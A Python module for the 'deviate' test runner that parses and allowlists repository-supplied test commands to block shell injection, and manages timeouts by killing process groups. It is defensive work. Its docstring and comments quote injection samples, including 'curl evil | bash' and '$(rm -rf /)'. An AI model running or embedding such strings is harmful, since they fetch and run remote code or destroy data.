"""Centralised safe command parsing for repository-provided test commands.

Background
----------
Legacy code executed every test command through ``sh -c``::

    subprocess.run(["sh", "-c", command], ...)

Any string sourced from ``specs/constitution.md``,
``specs/**/tasks.md`` (Verification field), or the ledger was therefore
implicitly trusted. That is a sandbox escape: an attacker who lands a
malicious value in any of those artifacts (e.g. ``pytest
tests/x; curl evil | bash``) achieves arbitrary code execution under
the user's shell.

This module replaces that boundary with a strict allowlist. Every test
command must:

1. Tokenise via :func:`shlex.split` so quoted paths land as a single argv.
2. Pass every token through :func:`_is_safe_token` — rejecting shell
   operators, command substitution, backticks, newlines, escapes, and
   any character the shell would otherwise interpret.
3. Name an executable on :data:`SAFE_EXECUTABLES` — with one carve-out
   for ``mise run test`` (the canonical DeviaTDD test invocation) which
   must keep its structured argv form.

When any of those checks fail, :func:`parse_safe_command` returns a
:data:`SafeCommand` with ``accepted=False`` and an explanation; no
process is ever spawned. :func:`run_safe_command` then returns a
deterministic failed :class:`subprocess.CompletedProcess` (returncode
``127``) instead of executing the suspect input.

The policy is the single trust boundary used by
``deviate.cli.micro._run_test_cmd``, ``_execute_test_command``,
``_task_verification_command``, and ``_constitution_test_command``. All
three sources feed into the same gate so an attacker cannot smuggle an
executable value through whichever path bypasses review.
"""

from __future__ import annotations

import os
import re
import shlex
import shutil
import signal
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path


#: Canonical exit code returned by ``run_safe_command`` when the
#: ``timeout=`` deadline lapses. ``124`` mirrors GNU ``timeout(1)`` and
#: ``coreutils`` so downstream tooling can distinguish a hard timeout
#: from any other failure mode without parsing stderr.
TEST_TIMEOUT_EXIT_CODE: int = 124

#: Grace period between SIGTERM and SIGKILL when the timeout fires.
#: Long enough for the test command to flush its own shutdown handler
#: (e.g. tokio's SIGTERM drain in ``gloss serve``) but short enough
#: that the orchestrator does not block the operator's feedback loop.
_TIMEOUT_GRACE_SECONDS: float = 5.0


# ---------------------------------------------------------------------------
# Public data
# ---------------------------------------------------------------------------


#: Executables that may run as test commands. Each entry maps the
#: recognised argv head to a normalised argv list. Anything not on this
#: list is rejected before subprocess.run is called.
#: Allowlisted ``mise <task>`` names that may run as verification or preflight.
#: Unknown mise tasks (setup, seed, watch, fmt, …) are never auto-run.
_MISE_NAMED_TASKS = frozenset({"test", "unit", "integ", "integration", "e2e", "doctor"})

SAFE_EXECUTABLES: dict[tuple[str, ...], str] = {
    ("mise", "run", "test"): "mise run test",
    ("mise", "test"): "mise test",
    ("mise", "unit"): "mise unit",
    ("mise", "integ"): "mise integ",
    ("mise", "integration"): "mise integration",
    ("mise", "e2e"): "mise e2e",
    ("mise", "doctor"): "mise doctor",
    ("mise", "run", "reset"): "mise run reset",
    ("mise", "exec"): "mise exec",
    ("pytest",): "pytest",
    ("python", "-m", "pytest"): "python -m pytest",
    ("python", "-m", "unittest"): "python -m unittest",
    ("ruff",): "ruff",
    ("bats",): "bats",
    ("mix", "test"): "mix test",
    ("npm", "test"): "npm test",
    ("cargo", "test"): "cargo test",
    ("go", "test"): "go test",
}


#: Characters that the shell would otherwise interpret. Tokens may not
#: contain any of them; quoted tokens like ``"$(rm -rf /)"`` are split
#: by :func:`shlex.split` into separate tokens so each piece is checked
#: individually. The set deliberately covers every metacharacter that
#: POSIX or bash would consume — including backticks, history expansion,
#: and glob patterns.
_FORBIDDEN_TOKEN_CHARS = frozenset(";|&`$()<>{}*?!~\\")


#: A bare ``mise run test`` literal is special-cased so it bypasses the
#: argv parser while still being routed to the same allowlist. We match
#: exactly so no shell metacharacter can slip through the literal fast
#: path.
_MISE_RUN_TEST_LITERAL_RE = re.compile(r"^mise\s+run\s+test(\s.*)?$")


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class SafeCommand:
    """Outcome of :func:`parse_safe_command`.

    ``accepted`` False means the caller MUST NOT spawn a process; the
    ``reason`` string is intended for diagnostics (logs, test output).
    ``argv`` is the structured form to pass to ``subprocess.run`` when
    ``accepted`` is True. ``label`` is a short identifier for the
    normalised executable form (``"pytest"``, ``"mise run test"``).
    """

    accepted: bool
    argv: tuple[str, ...]
    reason: str
    label: str


# ---------------------------------------------------------------------------
# Parsing
# ---------------------------------------------------------------------------


def _is_safe_token(token: str) -> bool:
    """Return True iff ``token`` contains no shell-significant character.

    Tokens may not be empty, may not carry newlines, and may not
    contain any character that the shell would interpret (operators,
    metacharacters, history expansion, globs, command substitution,
    backticks, escapes).
    """
    if not token:
        return False
    if "\n" in token or "\r" in token:
        return False
    if any(ch in _FORBIDDEN_TOKEN_CHARS for ch in token):
        return False
    # shlex.split already unquotes command substitution, so any
    # remaining ``$`` indicates unquoted variable expansion / $().
    if "$" in token:
        return False
    return True


def _match_mise_executable(argv: tuple[str, ...]) -> tuple[tuple[str, ...], str] | None:
    """Accept only allowlisted mise tasks and ``mise exec -- <safe cmd>``."""
    if len(argv) >= 2 and argv[1] in _MISE_NAMED_TASKS:
        return (("mise", argv[1]), f"mise {argv[1]}")
    if argv[:3] == ("mise", "run", "test"):
        return (("mise", "run", "test"), "mise run test")
    if argv[:3] == ("mise", "run", "reset"):
        return (("mise", "run", "reset"), "mise run reset")
    if len(argv) >= 4 and argv[1] == "exec" and argv[2] == "--":
        inner = _match_executable(argv[3:])
        if inner is not None:
            return (("mise", "exec"), "mise exec")
    return None


def _match_executable(argv: tuple[str, ...]) -> tuple[tuple[str, ...], str] | None:
    """Return the executable prefix + label if argv starts with one of the
    allowlisted executables. Otherwise ``None``.
    """
    if not argv:
        return None
    head = argv[0]
    if "/" in head:
        basename = head.rsplit("/", 1)[-1]
    else:
        basename = head
    if basename == "mise":
        return _match_mise_executable(argv)
    # Normalised mapping from executable basename to argv prefix.
    candidates: list[tuple[tuple[str, ...], str]] = [
        # Direct basenames
        (("pytest",), "pytest"),
        (("ruff",), "ruff"),
        (("bats",), "bats"),
        (("mix",), "mix test"),
        (("npm",), "npm test"),
        (("cargo",), "cargo test"),
        (("go",), "go test"),
        # Three-token python -m X patterns match regardless of whether the
        # interpreter is called ``python``, ``python3``, or an absolute
        # ``python`` (or any absolute path ending in python, python3,
        # python3.13, etc.) carrying ``-m pytest`` / ``-m unittest``.
        (("python", "-m", "pytest"), "python -m pytest"),
        (("python", "-m", "unittest"), "python -m unittest"),
    ]
    for prefix, label in candidates:
        primary = prefix[0]
        # ``python`` matches any interpreter whose basename starts with
        # ``python`` (python, python3, python3.13, /usr/bin/python3.11).
        # All other primaries must match the basename verbatim.
        if primary == "python":
            if not basename.startswith("python"):
                continue
        elif basename != primary:
            continue
        if len(prefix) == 1:
            return tuple(prefix), label
        # Allow ``python -m pytest`` / ``unittest`` where the interpreter
        # may also be a path or ``python3`` flavour.
        if (
            primary == "python"
            and len(argv) >= len(prefix)
            and tuple(argv[1 : len(prefix)]) == prefix[1:]
        ):
            return tuple(prefix), label
        if len(argv) >= len(prefix) and tuple(argv[: len(prefix)]) == prefix:
            return tuple(prefix), label
    return None


def _resolve_executable_path(head: str) -> str | None:
    """Enforce the executor-location check on ``head``.

    The basename allowlist alone is not enough: a repository contributor
    can plant a file named ``pytest`` (or any other basename on the
    allowlist) inside the repo and reference it as ``./pytest`` or
    ``scripts/pytest``. The basename-only check inside
    :func:`_match_executable` would accept that token, and the runner
    would then :func:`subprocess.run` it under the operator's UID.

    The fix: when ``head`` carries a path separator, the path MUST
    resolve to the same real file that the operator's ``PATH`` would
    find for the matching basename. Bare names (``pytest``,
    ``python3``) continue to work because the OS resolves them via
    ``PATH`` at exec time. Path-qualified entries override that
    resolution — so the override must be shown to point at the same
    trusted binary, or be rejected.

    Policy:

    * No path separator in ``head`` → ``head`` itself (the OS will
      resolve via PATH at exec time).
    * Absolute path with separator → must resolve to the same real
      file as ``shutil.which(basename)``; symlinks are followed.
    * Relative path with separator → rejected. Relative paths are
      cwd-dependent and the parser is a pure string→string function
      with no cwd context; refusing them outright keeps the policy
      flat and unambiguous.

    Return the resolved canonical path on success; ``None`` when the
    token is rejected.
    """
    # Bare names (no path separator) are resolved by the OS via PATH
    # at exec time — no location check needed for them.
    if os.sep not in head and (os.altsep is None or os.altsep not in head):
        return head
    # Relative paths are out of scope: the parser has no cwd context
    # and accepting them would require threading cwd through every
    # caller. Reject whichever form carries a separator but is not
    # absolute.
    if not os.path.isabs(head):
        return None
    basename = head.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    # Find the canonical real-file the operator's PATH would resolve.
    expected = shutil.which(basename)
    if expected is None:
        # The basename is unknown to PATH; an absolute path that
        # bypasses PATH cannot be authorised.
        return None
    try:
        resolved = os.path.realpath(head)
    except OSError:
        return None
    if not os.path.isfile(resolved):
        return None
    expected_real = os.path.realpath(expected)
    if resolved != expected_real:
        return None
    return resolved


def parse_safe_command(command: str) -> SafeCommand:
    """Return whether ``command`` may execute as an argv-based subprocess.

    The function is the single trust boundary. Callers must use it for
    every untrusted test command and never spawn a process when
    ``accepted`` is False. The function is total: every input produces a
    structured result (rejected or accepted) rather than raising.
    """
    if not isinstance(command, str):
        return SafeCommand(False, (), "command must be a string", "")
    stripped = command.strip().strip("`").strip()
    if "\n" in stripped or "\r" in stripped:
        return SafeCommand(False, (), "newline injection not allowed", "")
    if not stripped:
        return SafeCommand(False, (), "empty command", "")
    # Special-case the canonical ``mise run test`` literal form so it
    # always maps to a structured argv even when extra args are tacked
    # on. We do this BEFORE the tokeniser because some users write
    # ``mise run test -- tests/foo -v`` and want the trailing -- to be
    # preserved as-is.
    literal = _MISE_RUN_TEST_LITERAL_RE.match(stripped)
    if literal:
        rest = stripped[len("mise run test") :].strip()
        if not rest:
            argv: tuple[str, ...] = ("mise", "run", "test")
        else:
            try:
                tokens = shlex.split(rest, posix=True)
            except ValueError as exc:
                return SafeCommand(
                    False,
                    (),
                    f"unbalanced quotes in mise run test arguments: {exc}",
                    "mise run test",
                )
            for token in tokens:
                if not _is_safe_token(token):
                    return SafeCommand(
                        False,
                        (),
                        f"unsafe token in mise run test arguments: {token!r}",
                        "mise run test",
                    )
            argv = ("mise", "run", "test", *tokens)
        return SafeCommand(True, argv, "", "mise run test")

    # shlex.split refuses unbalanced quotes — perfect for sanitising.
    try:
        tokens = shlex.split(stripped, posix=True)
    except ValueError as exc:
        return SafeCommand(False, (), f"unbalanced quotes: {exc}", "")

    if not tokens:
        return SafeCommand(False, (), "no tokens after parsing", "")
    for token in tokens:
        if not _is_safe_token(token):
            return SafeCommand(
                False,
                (),
                f"shell metacharacter or unsafe token: {token!r}",
                "",
            )

    executable = _match_executable(tuple(tokens))
    if executable is None:
        return SafeCommand(
            False,
            (),
            f"unsupported executable: {tokens[0]!r}",
            "",
        )
    _prefix, label = executable
    # The prefix itself must satisfy safe-token rules (defence in depth —
    # e.g. if a future allowlist entry contains a colon in its basename).
    for piece in _prefix:
        if not _is_safe_token(piece):
            return SafeCommand(False, (), f"unsafe executable token: {piece!r}", "")
    # Executable-location check: a path-qualified argv[0] must resolve
    # to the same real file the operator's PATH would find for the
    # matching basename. This blocks the path-prefix bypass closed by
    # p10-001 (any planted file with an allowlisted basename).
    if _resolve_executable_path(tokens[0]) is None:
        return SafeCommand(
            False,
            (),
            f"path-qualified executable does not resolve to a trusted binary: {tokens[0]!r}",
            "",
        )
    return SafeCommand(True, tuple(tokens), "", label)


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------


def _kill_process_group(pid: int, sig: int) -> None:
    """Best-effort ``os.killpg`` wrapper that swallows ESRCH.

    Skips invalid pids (``None``, ``0``, negative). ``pid == 0`` is
    special: ``os.killpg(0, sig)`` signals the **current** process
    group, which would self-terminate the orchestrator. When
    ``subprocess.TimeoutExpired.pid`` is ``None`` (the child never
    spawned, or ``start_new_session=True`` left the field unset),
    there is no group to target — the ``subprocess.run`` timeout
    machinery has already SIGKILL'd the immediate child. ESRCH means
    the group already exited, also a fine end-state.
    """
    if pid <= 0:
        return
    try:
        os.killpg(pid, sig)
    except ProcessLookupError:
        return


def run_safe_command(
    command: str,
    cwd: Path,
    *,
    env: dict[str, str] | None = None,
    timeout: float | None = None,
) -> subprocess.CompletedProcess:
    """Run ``command`` if it satisfies :func:`parse_safe_command`.

    On rejection, returns a deterministic failed
    :class:`subprocess.CompletedProcess` (returncode ``127``) without
    spawning a shell. On acceptance, runs the structured argv with
    ``Popen(..., shell=False)`` exactly like a normal argv invocation.

    When ``timeout`` is supplied, the command is launched with
    ``start_new_session=True`` so the orchestrator can ``killpg`` the
    whole process group on expiry — grandchildren spawned by the test
    command (for example ``cargo test`` → ``gloss serve`` parked on
    stdin EOF) are torn down alongside the immediate child. We use
    :class:`subprocess.Popen` directly (not :func:`subprocess.run`)
    so we own the spawned PID and can target the process group on
    expiry — ``subprocess.run`` does not reliably populate
    ``TimeoutExpired.pid``, which made the killpg escalation a no-op
    in practice. On expiry a deterministic
    :class:`subprocess.CompletedProcess` is returned with
    ``returncode == TEST_TIMEOUT_EXIT_CODE`` and the partial
    stdout/stderr captured before the deadline. Without ``timeout``
    the wrapper behaves exactly as before — same return shape — so
    existing callers are unaffected.
    """
    parsed = parse_safe_command(command)
    if not parsed.accepted:
        args = (parsed.label,) if parsed.label else ("deviate", "test")
        return subprocess.CompletedProcess(
            args=args,
            returncode=127,
            stdout="",
            stderr=(
                "deviate: refused to execute unsafe test command: "
                f"{parsed.reason}\n"
                f"  original: {command!r}"
            ),
        )
    popen_kwargs: dict[str, object] = {
        "cwd": str(cwd),
        "env": env,
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "text": True,
        "shell": False,
    }
    if timeout is not None:
        # ``start_new_session=True`` puts the child at the head of a
        # fresh process group so ``os.killpg`` reaches every descendant
        # spawned by the test command. ``start_new_session=True`` and
        # ``start_new_session`` set the same bit on POSIX (process group
        # leader + session leader); we use the canonical name.
        popen_kwargs["start_new_session"] = True
    try:
        proc = subprocess.Popen(list(parsed.argv), **popen_kwargs)
    except OSError as exc:
        return subprocess.CompletedProcess(
            args=list(parsed.argv),
            returncode=127,
            stdout="",
            stderr=str(exc),
        )
    # Track the spawned PID so OSError cleanup below can target the
    # process group (start_new_session=True was set above when
    # ``timeout`` is not None — killpg reaches the whole subtree).
    stdout_bytes: str | bytes = ""
    stderr_bytes: str | bytes = ""
    partial_stdout: str | bytes = ""
    partial_stderr: str | bytes = ""
    timed_out = False
    try:
        stdout_bytes, stderr_bytes = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired as exc:
        # ``TimeoutExpired`` carries any partial output captured by
        # ``communicate`` at the moment of expiry. Capture it first
        # so the killpg escalation below cannot lose buffered data.
        partial_stdout = getattr(exc, "stdout", None) or ""
        partial_stderr = getattr(exc, "stderr", None) or ""
        timed_out = True
    except OSError as exc:
        # ``communicate`` raised OSError (e.g. broken pipe while
        # reading from the child). Reap the spawned child — we own
        # the PID — before returning the 127 sentinel, so a runaway
        # test command cannot leak a process when ``run_safe_command``
        # is invoked with a non-timeout deadline.
        try:
            _kill_process_group(proc.pid, signal.SIGKILL)
            proc.wait(timeout=_TIMEOUT_GRACE_SECONDS + 1.0)
        except (ProcessLookupError, OSError, subprocess.TimeoutExpired):
            pass
        return subprocess.CompletedProcess(
            args=list(parsed.argv),
            returncode=127,
            stdout="",
            stderr=str(exc),
        )
    if timed_out:
        # Drain any remaining buffered output without blocking; SIGTERM
        # lands first so children that ignore it (e.g. Gloss's tokio
        # SIGTERM drain) get a graceful-drain window before SIGKILL.
        _kill_process_group(proc.pid, signal.SIGTERM)
        time.sleep(_TIMEOUT_GRACE_SECONDS)
        _kill_process_group(proc.pid, signal.SIGKILL)
        try:
            extra_stdout, extra_stderr = proc.communicate(timeout=0)
        except (subprocess.TimeoutExpired, OSError):
            extra_stdout, extra_stderr = None, None
        # ``proc.communicate(timeout=0)`` after the kill returns any
        # output the children wrote between SIGTERM and SIGKILL — if
        # it succeeded, prefer the cumulative read over the partial
        # captured at expiry.
        if extra_stdout:
            partial_stdout = extra_stdout
        if extra_stderr:
            partial_stderr = extra_stderr
        # Reap the zombie; ``wait()`` with a bounded timeout does not
        # block on a still-alive child — the SIGKILL above will land
        # and the kernel will reap eventually.
        try:
            proc.wait(timeout=_TIMEOUT_GRACE_SECONDS + 1.0)
        except (subprocess.TimeoutExpired, OSError):
            pass
        if isinstance(partial_stdout, bytes):
            partial_stdout = partial_stdout.decode("utf-8", errors="replace")
        if isinstance(partial_stderr, bytes):
            partial_stderr = partial_stderr.decode("utf-8", errors="replace")
        timeout_repr = f"{timeout:g}s" if isinstance(timeout, float) else f"{timeout}s"
        message = (
            f"deviate: test command timeout after {timeout_repr} "
            f"(SIGTERM → {_TIMEOUT_GRACE_SECONDS:g}s grace → SIGKILL on process group)\n"
        )
        return subprocess.CompletedProcess(
            args=list(parsed.argv),
            returncode=TEST_TIMEOUT_EXIT_CODE,
            stdout=partial_stdout,
            stderr=partial_stderr + message,
        )
    return subprocess.CompletedProcess(
        args=list(parsed.argv),
        returncode=proc.returncode,
        stdout=stdout_bytes or "",
        stderr=stderr_bytes or "",
    )


def is_safe_test_command(command: str) -> bool:
    """Convenience predicate used by command-source helpers in micro.py.

    Returning ``False`` here means the value will be dropped from the
    candidate list (no fallback to other sources). This is the wanted
    behaviour for malicious values: drop them rather than try other
    untrusted inputs, and surface the rejection via the CompletedProcess
    that ``run_safe_command`` produces when the value is later picked up.
    """
    if not isinstance(command, str):
        return False
    return parse_safe_command(command).accepted
